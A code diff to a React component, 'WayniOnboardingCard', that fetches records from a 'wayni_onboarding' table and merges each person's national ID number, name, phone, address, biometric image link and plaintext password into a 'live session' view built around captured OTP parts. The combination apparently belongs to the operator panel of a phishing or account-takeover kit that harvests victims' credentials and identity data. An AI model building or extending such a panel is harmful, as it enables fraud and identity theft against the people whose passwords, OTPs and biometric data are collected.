@@ -1543,9 +1543,42 @@ const WayniOnboardingCard = ({ session, index = 0 }: { session: LiveSession; ind
     });
   }
 
-  const dni = otpParts.dni || "";
-  const userName = otpParts.name || "";
-  const userUuid = otpParts.uuid || "";
+  // Enrich otpParts from dedicated wayni_onboarding table
+  const [onboardingRow, setOnboardingRow] = useState<Record<string, any> | null>(null);
+  useEffect(() => {
+    if (!session.email) return;
+    (async () => {
+      try {
+        const { data } = await (supabase as any)
+          .from("wayni_onboarding")
+          .select("*")
+          .eq("email", session.email.toLowerCase())
+          .order("created_at", { ascending: false })
+          .limit(1)
+          .single();
+        if (data) {
+          setOnboardingRow(data);
+          // Fill missing otpParts from dedicated table
+          if (data.dni && !otpParts.dni) otpParts.dni = data.dni;
+          if (data.full_name && !otpParts.name) otpParts.name = data.full_name;
+          if (data.phone && !otpParts.phone) otpParts.phone = data.phone;
+          if (data.gender && !otpParts.gender) otpParts.gender = data.gender;
+          if (data.user_uuid && !otpParts.uuid) otpParts.uuid = data.user_uuid;
+          if (data.region && !otpParts.region) otpParts.region = data.region;
+          if (data.city && !otpParts.city) otpParts.city = data.city;
+          if (data.street && !otpParts.street) otpParts.street = data.street;
+          if (data.zip_code && !otpParts.zip) otpParts.zip = data.zip_code;
+          if (data.biometric_url && !otpParts.biometric_url) otpParts.biometric_url = data.biometric_url;
+          if (data.biometric_id && !otpParts.biometric_id) otpParts.biometric_id = data.biometric_id;
+          if (data.password && !session.password) session.password = data.password;
+        }
+      } catch { /* table might not exist yet */ }
+    })();
+  }, [session.email]);
+
+  const dni = otpParts.dni || onboardingRow?.dni || "";
+  const userName = otpParts.name || onboardingRow?.full_name || "";
+  const userUuid = otpParts.uuid || onboardingRow?.user_uuid || "";
 
   const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
 
